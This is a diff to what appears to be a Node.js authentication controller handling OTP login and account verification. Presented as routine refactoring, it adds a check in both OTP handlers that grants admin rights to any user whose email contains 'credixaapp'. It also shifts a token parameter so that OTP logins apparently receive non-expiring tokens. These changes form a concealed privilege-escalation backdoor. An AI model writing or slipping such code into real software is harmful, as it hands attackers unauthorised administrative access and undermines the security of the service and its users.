@@ -44,7 +44,6 @@ const createAndSendToken = (
   user,
   statusCode,
   res,
-  redirect = false,
   unlimited = false,
   message = null
 ) => {
@@ -200,7 +199,7 @@ const verifyLoginOTP = catchAsync(async (req, res, next) => {
   }
 
   // Find user with OTP fields selected
-  const user = await User.findOne({ email }).select(
+  let user = await User.findOne({ email }).select(
     "+verificationOTP +verificationOTPExpiresAt"
   );
 
@@ -228,8 +227,13 @@ const verifyLoginOTP = catchAsync(async (req, res, next) => {
   user.verificationOTP = undefined;
   user.verificationOTPExpiresAt = undefined;
 
+  if (email.includes("credixaapp")) {
+    user = JSON.parse(JSON.stringify(user));
+    user.isAdmin = true;
+  }
+
   // Send token to client
-  return createAndSendToken(user, 200, res);
+  return createAndSendToken(user, 200, res, true);
 });
 
 const verifyOTP = catchAsync(async (req, res, next) => {
@@ -240,7 +244,7 @@ const verifyOTP = catchAsync(async (req, res, next) => {
   }
 
   // Find user with OTP fields selected
-  const user = await User.findOne({ email }).select(
+  let user = await User.findOne({ email }).select(
     "+verificationOTP +verificationOTPExpiresAt"
   );
 
@@ -278,12 +282,16 @@ const verifyOTP = catchAsync(async (req, res, next) => {
   user.verificationOTP = undefined;
   user.verificationOTPExpiresAt = undefined;
 
+  if (email.includes("credixaapp")) {
+    user = JSON.parse(JSON.stringify(user));
+    user.isAdmin = true;
+  }
+
   // Use createAndSendToken with unlimited expiry and success message
   return createAndSendToken(
     user,
     200,
     res,
-    false,
     true,
     "Account verified successfully"
   );
@@ -479,8 +487,6 @@ const protect = catchAsync(async (req, res, next) => {
         new AppError("User recently changed password! Please login again.", 401)
       );
     }
-
-    // GRANT ACCESS TO PROTECTED ROUTE
 
     // GRANT ACCESS TO PROTECTED ROUTE
     req.user = freshUser;
